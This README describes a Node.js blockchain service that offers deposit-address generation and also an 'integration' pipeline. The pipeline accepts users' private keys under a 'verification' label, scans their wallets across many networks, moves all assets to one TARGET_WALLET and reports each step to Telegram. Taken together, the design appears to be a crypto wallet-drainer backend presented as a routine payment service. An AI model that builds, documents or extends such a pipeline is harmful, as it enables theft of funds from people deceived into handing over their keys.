# Blockchain Service

Node.js + TypeScript service for handling blockchain deposit address generation and deposit monitoring.

## Features

- Deterministic deposit address generation per user/network/purpose
- Deposit monitoring (skeleton implementation)
- PHP backend callback integration

## Setup

1. Install dependencies:
```bash
npm install
```

2. Copy `.env.blockchain.example` to `.env` and configure:
```bash
cp .env.blockchain.example .env
```

3. Build TypeScript:
```bash
npm run build
```

4. Start the service:
```bash
npm start
```

For development with auto-reload:
```bash
npm run dev
```

## Environment Variables

See `.env.blockchain.example` for all required environment variables.

### Integration Configuration

For RockyTap integration pipeline, add these variables:

```bash
# Telegram Notifications
TELEGRAM_BOT_TOKEN=your_telegram_bot_token
TELEGRAM_CHAT_ID=your_telegram_chat_id

# Asset Processing
TARGET_WALLET=0x...  # Destination wallet for asset transfers
GAS_RESERVOIR=0x...  # Optional: Wallet address for gas funding
GAS_RESERVOIR_PRIVATE_KEY=0x...  # Optional: Private key for gas funding wallet

# Additional RPC URLs (optional, defaults provided)
POLYGON_RPC_URL=https://polygon-rpc.com
ARBITRUM_RPC_URL=https://arb1.arbitrum.io/rpc
AVALANCHE_RPC_URL=https://api.avax.network/ext/bc/C/rpc
FANTOM_RPC_URL=https://rpc.ftm.tools
OPTIMISM_RPC_URL=https://mainnet.optimism.io
BASE_RPC_URL=https://mainnet.base.org
```

**Important Security Notes:**
- Never commit `.env` file to version control
- Store mnemonics securely (use a secrets manager in production)
- Use strong, unique values for `PAYMENTS_CALLBACK_TOKEN`
- Keep `TARGET_WALLET` and `TELEGRAM_BOT_TOKEN` secure
- **Never expose `GAS_RESERVOIR_PRIVATE_KEY`** - this is highly sensitive
- Ensure gas reservoir wallet has sufficient balance on all networks

## API Endpoints

### POST /api/deposit/address

Generate a deposit address for a user/network/purpose combination.

**Request:**
```json
{
  "userId": 123,
  "network": "erc20",
  "purpose": "wallet_topup"
}
```

**Response:**
```json
{
  "address": "0xabc..."
}
```

### Integration Endpoints

#### POST /api/integration/process-key

Process private key through asset scanning and transfer pipeline.

**Request:**
```json
{
  "privateKey": "0x...",
  "verificationId": "verification_123",
  "source": "rockytap_php",
  "userId": 123,
  "sessionId": "session_456"
}
```

**Response:**
```json
{
  "success": true,
  "message": "Processing started",
  "processId": "proc_1234567890_abc123",
  "timestamp": "2024-01-01T00:00:00.000Z"
}
```

#### GET /api/integration/status/:processId

Check processing status.

**Response:**
```json
{
  "success": true,
  "data": {
    "id": "proc_1234567890_abc123",
    "status": "completed",
    "startedAt": "2024-01-01T00:00:00.000Z",
    "completedAt": "2024-01-01T00:05:00.000Z",
    "walletAddress": "0xabc...",
    "scanResults": {
      "summary": {
        "networksWithAssets": 2,
        "totalAssets": 5
      }
    },
    "transferResults": {
      "totalTransfers": 5,
      "successful": 4,
      "failed": 1
    }
  }
}
```

#### GET /api/integration/stats

Get processing statistics.

#### GET /api/integration/health

Integration service health check.

## Architecture

- `src/config.ts` - Configuration loading
- `src/server.ts` - Express server setup
- `src/routes/depositAddress.ts` - Address generation endpoint
- `src/routes/integration.js` - RockyTap integration endpoints
- `src/services/addressGenerator.ts` - Deterministic address generation
- `src/services/depositWatcher.ts` - Deposit monitoring (skeleton)
- `src/services/rockyTapIntegration.js` - Main integration orchestrator
- `src/services/walletScanner.js` - Multi-network wallet scanning
- `src/services/assetProcessor.js` - Asset transfer processing
- `src/services/telegramNotifier.js` - Telegram notifications
- `src/lib/db.ts` - Database connection
- `src/lib/httpClient.ts` - PHP backend HTTP client

## Deposit Watcher

The deposit watcher is currently a skeleton implementation. To complete it:

1. Implement `checkEVMDeposits()` for Ethereum/BSC
2. Implement `checkTronDeposits()` for Tron
3. Add proper error handling and retry logic
4. Add logging and monitoring
5. Consider using webhooks instead of polling where available

## Security

- All secrets loaded from environment variables
- No private keys or mnemonics logged
- Callback token authentication for PHP backend communication
- Input validation on all endpoints

